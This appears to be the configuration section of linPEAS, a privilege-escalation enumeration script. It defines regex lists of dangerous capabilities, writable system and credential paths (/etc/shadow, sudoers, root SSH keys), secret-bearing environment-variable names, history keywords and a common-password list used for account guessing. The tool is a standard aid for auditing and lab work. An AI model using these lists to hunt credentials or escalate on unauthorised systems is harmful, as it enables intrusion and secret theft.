capsB="=ep|cap_chown|cap_former|cap_setfcap|cap_dac_override|cap_dac_read_search|cap_setuid|cap_setgid|cap_kill|cap_net_bind_service|cap_net_raw|cap_net_admin|cap_sys_admin|cap_sys_ptrace|cap_sys_module"
containercapsB="sys_admin|sys_ptrace|sys_module|dac_read_search|dac_override|sys_rawio|syslog|net_raw|net_admin"

OLDPATH=$PATH
ADDPATH=":/usr/local/sbin\
 :/usr/local/bin\
 :/usr/sbin\
 :/usr/bin\
 :/sbin\
 :/bin"
spath=":$PATH"
for P in $ADDPATH; do
  if [ "${spath##*$P*}" ]; then export PATH="$PATH$P" 2>/dev/null; fi
done


E=E
echo | sed -${E} 's/o/a/' 2>/dev/null
if [ $? -ne 0 ] ; then
	echo | sed -r 's/o/a/' 2>/dev/null
	if [ $? -eq 0 ] ; then
		E=r
	else
		echo "${YELLOW}WARNING: No suitable option found for extended regex with sed. Continuing.${NC}"
	fi
fi

writeB="00-header|10-help-text|50-motd-news|80-esm|91-release-upgrade|\.sh$|\./|/authorized_keys|/bin/|/boot/|/etc/apache2/apache2.conf|/etc/apache2/httpd.conf|/etc/hosts.allow|/etc/hosts.deny|/etc/httpd/conf/httpd.conf|/etc/httpd/httpd.conf|/etc/inetd.conf|/etc/incron.conf|/etc/login.defs|/etc/logrotate.d/|/etc/modprobe.d/|/etc/pam.d/|/etc/php.*/fpm/pool.d/|/etc/php/.*/fpm/pool.d/|/etc/rsyslog.d/|/etc/skel/|/etc/sysconfig/network-scripts/|/etc/sysctl.conf|/etc/sysctl.d/|/etc/uwsgi/apps-enabled/|/etc/xinetd.conf|/etc/xinetd.d/|/etc/|/home//|/lib/|/log/|/mnt/|/root|/sys/|/usr/bin|/usr/games|/usr/lib|/usr/local/bin|/usr/local/games|/usr/local/sbin|/usr/sbin|/sbin/|/var/log/|\.timer$|\.service$|.socket$"
writeVB="/etc/anacrontab|/etc/apt/apt.conf.d|/etc/bash.bashrc|/etc/bash_completion|/etc/bash_completion.d/|/etc/cron|/etc/environment|/etc/environment.d/|/etc/group|/etc/incron.d/|/etc/init|/etc/ld.so.conf.d/|/etc/master.passwd|/etc/passwd|/etc/profile.d/|/etc/profile|/etc/rc.d|/etc/shadow|/etc/skey/|/etc/sudoers|/etc/sudoers.d/|/etc/supervisor/conf.d/|/etc/supervisor/supervisord.conf|/etc/systemd|/etc/sys|/lib/systemd|/etc/update-motd.d/|/root/.ssh/|/run/systemd|/usr/lib/cron/tabs/|/usr/lib/systemd|/systemd/system|/var/db/yubikey/|/var/spool/anacron|/var/spool/cron/crontabs|"$(echo $PATH 2>/dev/null | sed 's/:\.:/:/g' | sed 's/:\.$//g' | sed 's/^\.://g' | sed 's/:/$|^/g')

if [ "$MACPEAS" ]; then
  sh_usrs="ImPoSSssSiBlEee"
  nosh_usrs="ImPoSSssSiBlEee"
  dscl . list /Users | while read uname; do
    ushell=$(dscl . -read "/Users/$uname" UserShell | cut -d " " -f2)
    if  grep -q \"$ushell\" /etc/shells; then sh_usrs="$sh_usrs|$uname"; else nosh_usrs="$nosh_usrs|$uname"; fi
  done
else
  sh_usrs=$(cat /etc/passwd 2>/dev/null | grep -v "^root:" | grep -i "sh$" | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/' | sed 's/|sys|/|sys[\\\s:]|^sys$|/' | sed 's/|daemon|/|daemon[\\\s:]|^daemon$|/')"ImPoSSssSiBlEee" 
  nosh_usrs=$(cat /etc/passwd 2>/dev/null | grep -i -v "sh$" | sort | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/')"ImPoSSssSiBlEee"
fi
knw_usrs='_amavisd|_analyticsd|_appinstalld|_appleevents|_applepay|_appowner|_appserver|_appstore|_ard|_assetcache|_astris|_atsserver|_avbdeviced|_calendar|_captiveagent|_ces|_clamav|_cmiodalassistants|_coreaudiod|_coremediaiod|_coreml|_ctkd|_cvmsroot|_cvs|_cyrus|_datadetectors|_demod|_devdocs|_devicemgr|_diskimagesiod|_displaypolicyd|_distnote|_dovecot|_dovenull|_dpaudio|_driverkit|_eppc|_findmydevice|_fpsd|_ftp|_fud|_gamecontrollerd|_geod|_hidd|_iconservices|_installassistant|_installcoordinationd|_installer|_jabber|_kadmin_admin|_kadmin_changepw|_knowledgegraphd|_krb_anonymous|_krb_changepw|_krb_kadmin|_krb_kerberos|_krb_krbtgt|_krbfast|_krbtgt|_launchservicesd|_lda|_locationd|_logd|_lp|_mailman|_mbsetupuser|_mcxalr|_mdnsresponder|_mobileasset|_mysql|_nearbyd|_netbios|_netstatistics|_networkd|_nsurlsessiond|_nsurlstoraged|_oahd|_ondemand|_postfix|_postgres|_qtss|_reportmemoryexception|_rmd|_sandbox|_screensaver|_scsd|_securityagent|_softwareupdate|_spotlight|_sshd|_svn|_taskgated|_teamsserver|_timed|_timezone|_tokend|_trustd|_trustevaluationagent|_unknown|_update_sharing|_usbmuxd|_uucp|_warmd|_webauthserver|_windowserver|_www|_wwwproxy|_xserverdocs|daemon\W|^daemon$|message\+|syslog|www|www-data|mail|noboby|Debian\-\+|rtkit|systemd\+'
USER=$(whoami 2>/dev/null || echo "UserUnknown")
if [ ! "$HOME" ]; then
  if [ -d "/Users/$USER" ]; then HOME="/Users/$USER"; 
  else HOME="/home/$USER";
  fi
fi
Groups="ImPoSSssSiBlEee"$(groups "$USER" 2>/dev/null | cut -d ":" -f 2 | tr ' ' '|')


pwd_inside_history="enable_autologin|7z|unzip|useradd|linenum|linpeas|mkpasswd|htpasswd|openssl|PASSW|passw|shadow|root|snyk|sudo|^su|pkexec|^ftp|mongo|psql|mysql|rdesktop|xfreerdp|^ssh|steghide|@|KEY=|TOKEN=|BEARER=|Authorization:"

pwd_in_variables1="Dgpg.passphrase|Dsonar.login|Dsonar.projectKey|GITHUB_TOKEN|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|PUSHOVER_TOKEN|PUSHOVER_USER|VIRUSTOTAL_APIKEY|ACCESSKEY|ACCESSKEYID|ACCESS_KEY|ACCESS_KEY_ID|ACCESS_KEY_SECRET|ACCESS_SECRET|ACCESS_TOKEN|ACCOUNT_SID|ADMIN_EMAIL|ADZERK_API_KEY|ALGOLIA_ADMIN_KEY_1|ALGOLIA_ADMIN_KEY_2|ALGOLIA_ADMIN_KEY_MCM|ALGOLIA_API_KEY|ALGOLIA_API_KEY_MCM|ALGOLIA_API_KEY_SEARCH|ALGOLIA_APPLICATION_ID|ALGOLIA_APPLICATION_ID_1|ALGOLIA_APPLICATION_ID_2|ALGOLIA_APPLICATION_ID_MCM|ALGOLIA_APP_ID|ALGOLIA_APP_ID_MCM|ALGOLIA_SEARCH_API_KEY|ALGOLIA_SEARCH_KEY|ALGOLIA_SEARCH_KEY_1|ALIAS_NAME|ALIAS_PASS|ALICLOUD_ACCESS_KEY|ALICLOUD_SECRET_KEY|amazon_bucket_name|AMAZON_SECRET_ACCESS_KEY|ANDROID_DOCS_DEPLOY_TOKEN|android_sdk_license|android_sdk_preview_license|aos_key|aos_sec|APIARY_API_KEY|APIGW_ACCESS_TOKEN|API_KEY|API_KEY_MCM|API_KEY_SECRET|API_KEY_SID|API_SECRET|appClientSecret|APP_BUCKET_PERM|APP_NAME|APP_REPORT_TOKEN_KEY|APP_TOKEN|ARGOS_TOKEN|ARTIFACTORY_KEY|ARTIFACTS_AWS_ACCESS_KEY_ID|ARTIFACTS_AWS_SECRET_ACCESS_KEY|ARTIFACTS_BUCKET|ARTIFACTS_KEY|ARTIFACTS_SECRET|ASSISTANT_IAM_APIKEY|AURORA_STRING_URL|AUTH0_API_CLIENTID|AUTH0_API_CLIENTSECRET|AUTH0_AUDIENCE|AUTH0_CALLBACK_URL|AUTH0_CLIENT_ID"
pwd_in_variables2="AUTH0_CLIENT_SECRET|AUTH0_CONNECTION|AUTH0_DOMAIN|AUTHOR_EMAIL_ADDR|AUTHOR_NPM_API_KEY|AUTH_TOKEN|AWS-ACCT-ID|AWS-KEY|AWS-SECRETS|AWS.config.accessKeyId|AWS.config.secretAccessKey|AWSACCESSKEYID|AWSCN_ACCESS_KEY_ID|AWSCN_SECRET_ACCESS_KEY|AWSSECRETKEY|AWS_ACCESS|AWS_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_CF_DIST_ID|AWS_DEFAULT|AWS_DEFAULT_REGION|AWS_S3_BUCKET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_SECRET_KEY|AWS_SES_ACCESS_KEY_ID|AWS_SES_SECRET_ACCESS_KEY|B2_ACCT_ID|B2_APP_KEY|B2_BUCKET|baseUrlTravis|bintrayKey|bintrayUser|BINTRAY_APIKEY|BINTRAY_API_KEY|BINTRAY_KEY|BINTRAY_TOKEN|BINTRAY_USER|BLUEMIX_ACCOUNT|BLUEMIX_API_KEY|BLUEMIX_AUTH|BLUEMIX_NAMESPACE|BLUEMIX_ORG|BLUEMIX_ORGANIZATION|BLUEMIX_PASS|BLUEMIX_PASS_PROD|BLUEMIX_SPACE|BLUEMIX_USER|BRACKETS_REPO_OAUTH_TOKEN|BROWSERSTACK_ACCESS_KEY|BROWSERSTACK_PROJECT_NAME|BROWSER_STACK_ACCESS_KEY|BUCKETEER_AWS_ACCESS_KEY_ID|BUCKETEER_AWS_SECRET_ACCESS_KEY|BUCKETEER_BUCKET_NAME|BUILT_BRANCH_DEPLOY_KEY|BUNDLESIZE_GITHUB_TOKEN|CACHE_S3_SECRET_KEY|CACHE_URL|CARGO_TOKEN|CATTLE_ACCESS_KEY|CATTLE_AGENT_INSTANCE_AUTH|CATTLE_SECRET_KEY|CC_TEST_REPORTER_ID|CC_TEST_REPOTER_ID|CENSYS_SECRET|CENSYS_UID|CERTIFICATE_OSX_P12|CF_ORGANIZATION|CF_PROXY_HOST|channelId|CHEVERNY_TOKEN|CHROME_CLIENT_ID"
pwd_in_variables3="CHROME_CLIENT_SECRET|CHROME_EXTENSION_ID|CHROME_REFRESH_TOKEN|CI_DEPLOY_USER|CI_NAME|CI_PROJECT_NAMESPACE|CI_PROJECT_URL|CI_REGISTRY_USER|CI_SERVER_NAME|CI_USER_TOKEN|CLAIMR_DATABASE|CLAIMR_DB|CLAIMR_SUPERUSER|CLAIMR_TOKEN|CLIENT_ID|CLIENT_SECRET|CLI_E2E_CMA_TOKEN|CLI_E2E_ORG_ID|CLOUDAMQP_URL|CLOUDANT_APPLIANCE_DATABASE|CLOUDANT_ARCHIVED_DATABASE|CLOUDANT_AUDITED_DATABASE|CLOUDANT_DATABASE|CLOUDANT_ORDER_DATABASE|CLOUDANT_PARSED_DATABASE|CLOUDANT_PROCESSED_DATABASE|CLOUDANT_SERVICE_DATABASE|CLOUDFLARE_API_KEY|CLOUDFLARE_AUTH_EMAIL|CLOUDFLARE_AUTH_KEY|CLOUDFLARE_EMAIL|CLOUDFLARE_ZONE_ID|CLOUDINARY_URL|CLOUDINARY_URL_EU|CLOUDINARY_URL_STAGING|CLOUD_API_KEY|CLUSTER_NAME|CLU_REPO_URL|CLU_SSH_PRIVATE_KEY_BASE64|CN_ACCESS_KEY_ID|CN_SECRET_ACCESS_KEY|COCOAPODS_TRUNK_EMAIL|COCOAPODS_TRUNK_TOKEN|CODACY_PROJECT_TOKEN|CODECLIMATE_REPO_TOKEN|CODECOV_TOKEN|coding_token|CONEKTA_APIKEY|CONFIGURATION_PROFILE_SID|CONFIGURATION_PROFILE_SID_P2P|CONFIGURATION_PROFILE_SID_SFU|CONSUMERKEY|CONSUMER_KEY|CONTENTFUL_ACCESS_TOKEN|CONTENTFUL_CMA_TEST_TOKEN|CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN|CONTENTFUL_INTEGRATION_SOURCE_SPACE|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN_NEW|CONTENTFUL_ORGANIZATION"
pwd_in_variables4="CONTENTFUL_PHP_MANAGEMENT_TEST_TOKEN|CONTENTFUL_TEST_ORG_CMA_TOKEN|CONTENTFUL_V2_ACCESS_TOKEN|CONTENTFUL_V2_ORGANIZATION|CONVERSATION_URL|COREAPI_HOST|COS_SECRETS|COVERALLS_API_TOKEN|COVERALLS_REPO_TOKEN|COVERALLS_SERVICE_NAME|COVERALLS_TOKEN|COVERITY_SCAN_NOTIFICATION_EMAIL|COVERITY_SCAN_TOKEN|CYPRESS_RECORD_KEY|DANGER_GITHUB_API_TOKEN|DATABASE_HOST|DATABASE_NAME|DATABASE_PORT|DATABASE_USER|datadog_api_key|datadog_app_key|DB_CONNECTION|DB_DATABASE|DB_HOST|DB_PORT|DB_PW|DB_USER|DDGC_GITHUB_TOKEN|DDG_TEST_EMAIL|DDG_TEST_EMAIL_PW|DEPLOY_DIR|DEPLOY_DIRECTORY|DEPLOY_HOST|DEPLOY_PORT|DEPLOY_SECURE|DEPLOY_TOKEN|DEPLOY_USER|DEST_TOPIC|DHL_SOLDTOACCOUNTID|DH_END_POINT_1|DH_END_POINT_2|DIGITALOCEAN_ACCESS_TOKEN|DIGITALOCEAN_SSH_KEY_BODY|DIGITALOCEAN_SSH_KEY_IDS|DOCKER_EMAIL|DOCKER_KEY|DOCKER_PASSDOCKER_POSTGRES_URL|DOCKER_RABBITMQ_HOST|docker_repo|DOCKER_TOKEN|DOCKER_USER|DOORDASH_AUTH_TOKEN|DROPBOX_OAUTH_BEARER|ELASTICSEARCH_HOST|ELASTIC_CLOUD_AUTH|env.GITHUB_OAUTH_TOKEN|env.HEROKU_API_KEY|ENV_KEY|ENV_SECRET|ENV_SECRET_ACCESS_KEY|eureka.awsAccessId"
pwd_in_variables5="eureka.awsSecretKey|ExcludeRestorePackageImports|EXPORT_SPACE_ID|FIREBASE_API_JSON|FIREBASE_API_TOKEN|FIREBASE_KEY|FIREBASE_PROJECT|FIREBASE_PROJECT_DEVELOP|FIREBASE_PROJECT_ID|FIREBASE_SERVICE_ACCOUNT|FIREBASE_TOKEN|FIREFOX_CLIENT|FIREFOX_ISSUER|FIREFOX_SECRET|FLASK_SECRET_KEY|FLICKR_API_KEY|FLICKR_API_SECRET|FOSSA_API_KEY|ftp_host|FTP_LOGIN|FTP_PW|FTP_USER|GCLOUD_BUCKET|GCLOUD_PROJECT|GCLOUD_SERVICE_KEY|GCS_BUCKET|GHB_TOKEN|GHOST_API_KEY|GH_API_KEY|GH_EMAIL|GH_NAME|GH_NEXT_OAUTH_CLIENT_ID|GH_NEXT_OAUTH_CLIENT_SECRET|GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID|GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET|GH_OAUTH_CLIENT_ID|GH_OAUTH_CLIENT_SECRET|GH_OAUTH_TOKEN|GH_REPO_TOKEN|GH_TOKEN|GH_UNSTABLE_OAUTH_CLIENT_ID|GH_UNSTABLE_OAUTH_CLIENT_SECRET|GH_USER_EMAIL|GH_USER_NAME|GITHUB_ACCESS_TOKEN|GITHUB_API_KEY|GITHUB_API_TOKEN|GITHUB_AUTH|GITHUB_AUTH_TOKEN|GITHUB_AUTH_USER|GITHUB_CLIENT_ID|GITHUB_CLIENT_SECRET|GITHUB_DEPLOYMENT_TOKEN|GITHUB_DEPLOY_HB_DOC_PASS|GITHUB_HUNTER_TOKEN|GITHUB_KEY|GITHUB_OAUTH|GITHUB_OAUTH_TOKEN|GITHUB_RELEASE_TOKEN|GITHUB_REPO|GITHUB_TOKEN|GITHUB_TOKENS|GITHUB_USER|GITLAB_USER_EMAIL|GITLAB_USER_LOGIN|GIT_AUTHOR_EMAIL|GIT_AUTHOR_NAME|GIT_COMMITTER_EMAIL|GIT_COMMITTER_NAME|GIT_EMAIL|GIT_NAME|GIT_TOKEN|GIT_USER"
pwd_in_variables6="GOOGLE_CLIENT_EMAIL|GOOGLE_CLIENT_ID|GOOGLE_CLIENT_SECRET|GOOGLE_MAPS_API_KEY|GOOGLE_PRIVATE_KEY|gpg.passphrase|GPG_EMAIL|GPG_ENCRYPTION|GPG_EXECUTABLE|GPG_KEYNAME|GPG_KEY_NAME|GPG_NAME|GPG_OWNERTRUST|GPG_PASSPHRASE|GPG_PRIVATE_KEY|GPG_SECRET_KEYS|gradle.publish.key|gradle.publish.secret|GRADLE_SIGNING_KEY_ID|GREN_GITHUB_TOKEN|GRGIT_USER|HAB_AUTH_TOKEN|HAB_KEY|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|HEROKU_API_KEY|HEROKU_API_USER|HEROKU_EMAIL|HEROKU_TOKEN|HOCKEYAPP_TOKEN|INTEGRATION_TEST_API_KEY|INTEGRATION_TEST_APPID|INTERNAL-SECRETS|IOS_DOCS_DEPLOY_TOKEN|IRC_NOTIFICATION_CHANNEL|JDBC:MYSQL|jdbc_databaseurl|jdbc_host|jdbc_user|JWT_SECRET|KAFKA_ADMIN_URL|KAFKA_INSTANCE_NAME|KAFKA_REST_URL|KEYSTORE_PASS|KOVAN_PRIVATE_KEY|LEANPLUM_APP_ID|LEANPLUM_KEY|LICENSES_HASH|LICENSES_HASH_TWO|LIGHTHOUSE_API_KEY|LINKEDIN_CLIENT_ID|LINKEDIN_CLIENT_SECRET|LINODE_INSTANCE_ID|LINODE_VOLUME_ID|LINUX_SIGNING_KEY|LL_API_SHORTNAME|LL_PUBLISH_URL|LL_SHARED_KEY|LOOKER_TEST_RUNNER_CLIENT_ID|LOOKER_TEST_RUNNER_CLIENT_SECRET|LOOKER_TEST_RUNNER_ENDPOINT|LOTTIE_HAPPO_API_KEY|LOTTIE_HAPPO_SECRET_KEY|LOTTIE_S3_API_KEY|LOTTIE_S3_SECRET_KEY|mailchimp_api_key|MAILCHIMP_KEY|mailchimp_list_id|mailchimp_user|MAILER_HOST|MAILER_TRANSPORT|MAILER_USER"
pwd_in_variables7="MAILGUN_APIKEY|MAILGUN_API_KEY|MAILGUN_DOMAIN|MAILGUN_PRIV_KEY|MAILGUN_PUB_APIKEY|MAILGUN_PUB_KEY|MAILGUN_SECRET_API_KEY|MAILGUN_TESTDOMAIN|ManagementAPIAccessToken|MANAGEMENT_TOKEN|MANAGE_KEY|MANAGE_SECRET|MANDRILL_API_KEY|MANIFEST_APP_TOKEN|MANIFEST_APP_URL|MapboxAccessToken|MAPBOX_ACCESS_TOKEN|MAPBOX_API_TOKEN|MAPBOX_AWS_ACCESS_KEY_ID|MAPBOX_AWS_SECRET_ACCESS_KEY|MG_API_KEY|MG_DOMAIN|MG_EMAIL_ADDR|MG_EMAIL_TO|MG_PUBLIC_API_KEY|MG_SPEND_MONEY|MG_URL|MH_APIKEY|MILE_ZERO_KEY|MINIO_ACCESS_KEY|MINIO_SECRET_KEY|MYSQLMASTERUSER|MYSQLSECRET|MYSQL_DATABASE|MYSQL_HOSTNAMEMYSQL_USER|MY_SECRET_ENV|NETLIFY_API_KEY|NETLIFY_SITE_ID|NEW_RELIC_BETA_TOKEN|NGROK_AUTH_TOKEN|NGROK_TOKEN|node_pre_gyp_accessKeyId|NODE_PRE_GYP_GITHUB_TOKEN|node_pre_gyp_secretAccessKey|NPM_API_KEY|NPM_API_TOKEN|NPM_AUTH_TOKEN|NPM_EMAIL|NPM_SECRET_KEY|NPM_TOKEN|NUGET_APIKEY|NUGET_API_KEY|NUGET_KEY|NUMBERS_SERVICE|NUMBERS_SERVICE_PASS|NUMBERS_SERVICE_USER|OAUTH_TOKEN|OBJECT_STORAGE_PROJECT_ID|OBJECT_STORAGE_USER_ID|OBJECT_STORE_BUCKET|OBJECT_STORE_CREDS|OCTEST_SERVER_BASE_URL|OCTEST_SERVER_BASE_URL_2|OC_PASS|OFTA_KEY|OFTA_SECRET|OKTA_CLIENT_TOKEN|OKTA_DOMAIN|OKTA_OAUTH2_CLIENTID|OKTA_OAUTH2_CLIENTSECRET|OKTA_OAUTH2_CLIENT_ID|OKTA_OAUTH2_CLIENT_SECRET"
pwd_in_variables8="OKTA_OAUTH2_ISSUER|OMISE_KEY|OMISE_PKEY|OMISE_PUBKEY|OMISE_SKEY|ONESIGNAL_API_KEY|ONESIGNAL_USER_AUTH_KEY|OPENWHISK_KEY|OPEN_WHISK_KEY|OSSRH_PASS|OSSRH_SECRET|OSSRH_USER|OS_AUTH_URL|OS_PROJECT_NAME|OS_TENANT_ID|OS_TENANT_NAME|PAGERDUTY_APIKEY|PAGERDUTY_ESCALATION_POLICY_ID|PAGERDUTY_FROM_USER|PAGERDUTY_PRIORITY_ID|PAGERDUTY_SERVICE_ID|PANTHEON_SITE|PARSE_APP_ID|PARSE_JS_KEY|PAYPAL_CLIENT_ID|PAYPAL_CLIENT_SECRET|PERCY_TOKEN|PERSONAL_KEY|PERSONAL_SECRET|PG_DATABASE|PG_HOST|PLACES_APIKEY|PLACES_API_KEY|PLACES_APPID|PLACES_APPLICATION_ID|PLOTLY_APIKEY|POSTGRESQL_DB|POSTGRESQL_PASS|POSTGRES_ENV_POSTGRES_DB|POSTGRES_ENV_POSTGRES_USER|POSTGRES_PORT|PREBUILD_AUTH|PROD.ACCESS.KEY.ID|PROD.SECRET.KEY|PROD_BASE_URL_RUNSCOPE|PROJECT_CONFIG|PUBLISH_KEY|PUBLISH_SECRET|PUSHOVER_TOKEN|PUSHOVER_USER|PYPI_PASSOWRD|QUIP_TOKEN|RABBITMQ_SERVER_ADDR|REDISCLOUD_URL|REDIS_STUNNEL_URLS|REFRESH_TOKEN|RELEASE_GH_TOKEN|RELEASE_TOKEN|remoteUserToShareTravis|REPORTING_WEBDAV_URL|REPORTING_WEBDAV_USER|repoToken|REST_API_KEY|RINKEBY_PRIVATE_KEY|ROPSTEN_PRIVATE_KEY|route53_access_key_id|RTD_KEY_PASS|RTD_STORE_PASS|RUBYGEMS_AUTH_TOKEN|s3_access_key|S3_ACCESS_KEY_ID|S3_BUCKET_NAME_APP_LOGS|S3_BUCKET_NAME_ASSETS|S3_KEY"
pwd_in_variables9="S3_KEY_APP_LOGS|S3_KEY_ASSETS|S3_PHOTO_BUCKET|S3_SECRET_APP_LOGS|S3_SECRET_ASSETS|S3_SECRET_KEY|S3_USER_ID|S3_USER_SECRET|SACLOUD_ACCESS_TOKEN|SACLOUD_ACCESS_TOKEN_SECRET|SACLOUD_API|SALESFORCE_BULK_TEST_SECURITY_TOKEN|SANDBOX_ACCESS_TOKEN|SANDBOX_AWS_ACCESS_KEY_ID|SANDBOX_AWS_SECRET_ACCESS_KEY|SANDBOX_LOCATION_ID|SAUCE_ACCESS_KEY|SECRETACCESSKEY|SECRETKEY|SECRET_0|SECRET_10|SECRET_11|SECRET_1|SECRET_2|SECRET_3|SECRET_4|SECRET_5|SECRET_6|SECRET_7|SECRET_8|SECRET_9|SECRET_KEY_BASE|SEGMENT_API_KEY|SELION_SELENIUM_SAUCELAB_GRID_CONFIG_FILE|SELION_SELENIUM_USE_SAUCELAB_GRID|SENDGRID|SENDGRID_API_KEY|SENDGRID_FROM_ADDRESS|SENDGRID_KEY|SENDGRID_USER|SENDWITHUS_KEY|SENTRY_AUTH_TOKEN|SERVICE_ACCOUNT_SECRET|SES_ACCESS_KEY|SES_SECRET_KEY|setDstAccessKey|setDstSecretKey|setSecretKey|SIGNING_KEY|SIGNING_KEY_SECRET|SIGNING_KEY_SID|SNOOWRAP_CLIENT_SECRET|SNOOWRAP_REDIRECT_URI|SNOOWRAP_REFRESH_TOKEN|SNOOWRAP_USER_AGENT|SNYK_API_TOKEN|SNYK_ORG_ID|SNYK_TOKEN|SOCRATA_APP_TOKEN|SOCRATA_USER|SONAR_ORGANIZATION_KEY|SONAR_PROJECT_KEY|SONAR_TOKEN|SONATYPE_GPG_KEY_NAME|SONATYPE_GPG_PASSPHRASE|SONATYPE_PASSSONATYPE_TOKEN_USER|SONATYPE_USER|SOUNDCLOUD_CLIENT_ID|SOUNDCLOUD_CLIENT_SECRET|SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY"
pwd_in_variables10="SPA_CLIENT_ID|SPOTIFY_API_ACCESS_TOKEN|SPOTIFY_API_CLIENT_ID|SPOTIFY_API_CLIENT_SECRET|sqsAccessKey|sqsSecretKey|SRCCLR_API_TOKEN|SSHPASS|SSMTP_CONFIG|STARSHIP_ACCOUNT_SID|STARSHIP_AUTH_TOKEN|STAR_TEST_AWS_ACCESS_KEY_ID|STAR_TEST_BUCKET|STAR_TEST_LOCATION|STAR_TEST_SECRET_ACCESS_KEY|STORMPATH_API_KEY_ID|STORMPATH_API_KEY_SECRET|STRIPE_PRIVATE|STRIPE_PUBLIC|STRIP_PUBLISHABLE_KEY|STRIP_SECRET_KEY|SURGE_LOGIN|SURGE_TOKEN|SVN_PASS|SVN_USER|TESCO_API_KEY|THERA_OSS_ACCESS_ID|THERA_OSS_ACCESS_KEY|TRAVIS_ACCESS_TOKEN|TRAVIS_API_TOKEN|TRAVIS_COM_TOKEN|TRAVIS_E2E_TOKEN|TRAVIS_GH_TOKEN|TRAVIS_PULL_REQUEST|TRAVIS_SECURE_ENV_VARS|TRAVIS_TOKEN|TREX_CLIENT_ORGURL|TREX_CLIENT_TOKEN|TREX_OKTA_CLIENT_ORGURL|TREX_OKTA_CLIENT_TOKEN|TWILIO_ACCOUNT_ID|TWILIO_ACCOUNT_SID|TWILIO_API_KEY|TWILIO_API_SECRET|TWILIO_CHAT_ACCOUNT_API_SERVICE|TWILIO_CONFIGURATION_SID|TWILIO_SID|TWILIO_TOKEN|TWITTEROAUTHACCESSSECRET|TWITTEROAUTHACCESSTOKEN|TWITTER_CONSUMER_KEY|TWITTER_CONSUMER_SECRET|UNITY_SERIAL|URBAN_KEY|URBAN_MASTER_SECRET|URBAN_SECRET|userTravis|USER_ASSETS_ACCESS_KEY_ID|USER_ASSETS_SECRET_ACCESS_KEY|VAULT_APPROLE_SECRET_ID|VAULT_PATH|VIP_GITHUB_BUILD_REPO_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY_PASS"
pwd_in_variables11="VIRUSTOTAL_APIKEY|VISUAL_RECOGNITION_API_KEY|V_SFDC_CLIENT_ID|V_SFDC_CLIENT_SECRET|WAKATIME_API_KEY|WAKATIME_PROJECT|WATSON_CLIENT|WATSON_CONVERSATION_WORKSPACE|WATSON_DEVICE|WATSON_DEVICE_TOPIC|WATSON_TEAM_ID|WATSON_TOPIC|WIDGET_BASIC_USER_2|WIDGET_BASIC_USER_3|WIDGET_BASIC_USER_4|WIDGET_BASIC_USER_5|WIDGET_FB_USER|WIDGET_FB_USER_2|WIDGET_FB_USER_3|WIDGET_TEST_SERVERWORDPRESS_DB_USER|WORKSPACE_ID|WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY|WPT_DB_HOST|WPT_DB_NAME|WPT_DB_USER|WPT_PREPARE_DIR|WPT_REPORT_API_KEY|WPT_SSH_CONNECT|WPT_SSH_PRIVATE_KEY_BASE64|YANGSHUN_GH_TOKEN|YT_ACCOUNT_CHANNEL_ID|YT_ACCOUNT_CLIENT_ID|YT_ACCOUNT_CLIENT_SECRET|YT_ACCOUNT_REFRESH_TOKEN|YT_API_KEY|YT_CLIENT_ID|YT_CLIENT_SECRET|YT_PARTNER_CHANNEL_ID|YT_PARTNER_CLIENT_ID|YT_PARTNER_CLIENT_SECRET|YT_PARTNER_ID|YT_PARTNER_REFRESH_TOKEN|YT_SERVER_API_KEY|ZHULIANG_GH_TOKEN|ZOPIM_ACCOUNT_KEY"

top2000pwds="123456 password 123456789 12345678 12345 qwerty 123123 111111 abc123 1234567 dragon 1q2w3e4r sunshine 654321 master 1234 football 1234567890 000000 computer 666666 superman michael internet iloveyou daniel 1qaz2wsx monkey shadow jessica letmein baseball whatever princess abcd1234 123321 starwars 121212 thomas zxcvbnm trustno1 killer welcome jordan aaaaaa 123qwe freedom password1 charlie batman jennifer 7777777 michelle diamond oliver mercedes benjamin 11111111 snoopy samantha victoria matrix george alexander secret cookie asdfgh 987654321 123abc orange fuckyou asdf1234 pepper hunter silver joshua banana 1q2w3e chelsea 1234qwer summer qwertyuiop phoenix andrew q1w2e3r4 elephant rainbow mustang merlin london garfield robert chocolate 112233 samsung qazwsx matthew buster jonathan ginger flower 555555 test caroline amanda maverick midnight martin junior 88888888 anthony jasmine creative patrick mickey 123 qwerty123 cocacola chicken passw0rd forever william nicole hello yellow nirvana justin friends cheese tigger mother liverpool blink182 asdfghjkl andrea spider scooter richard soccer rachel purple morgan melissa jackson arsenal 222222 qwe123 gabriel ferrari jasper danielle bandit angela scorpion prince maggie austin veronica nicholas monster dexter carlos thunder success hannah ashley 131313 stella brandon pokemon joseph asdfasdf 999999 metallica december chester taylor sophie samuel rabbit crystal barney xxxxxx steven ranger patricia christian asshole spiderman sandra hockey angels security parker heather 888888 victor harley 333333 system slipknot november jordan23 canada tennis qwertyui casper gemini asd123 winter hammer cooper america albert 777777 winner charles butterfly swordfish popcorn penguin dolphin carolina access 987654 hardcore corvette apples 12341234 sabrina remember qwer1234 edward dennis cherry sparky natasha arthur vanessa marina leonardo johnny dallas antonio winston \
snickers olivia nothing iceman destiny coffee apollo 696969 windows williams school madison dakota angelina anderson 159753 1111 yamaha trinity rebecca nathan guitar compaq 123123123 toyota shannon playboy peanut pakistan diablo abcdef maxwell golden asdasd 123654 murphy monica marlboro kimberly gateway bailey 00000000 snowball scooby nikita falcon august test123 sebastian panther love johnson godzilla genesis brandy adidas zxcvbn wizard porsche online hello123 fuckoff eagles champion bubbles boston smokey precious mercury lauren einstein cricket cameron angel admin napoleon mountain lovely friend flowers dolphins david chicago sierra knight yankees wilson warrior simple nelson muffin charlotte calvin spencer newyork florida fernando claudia basketball barcelona 87654321 willow stupid samson police paradise motorola manager jaguar jackie family doctor 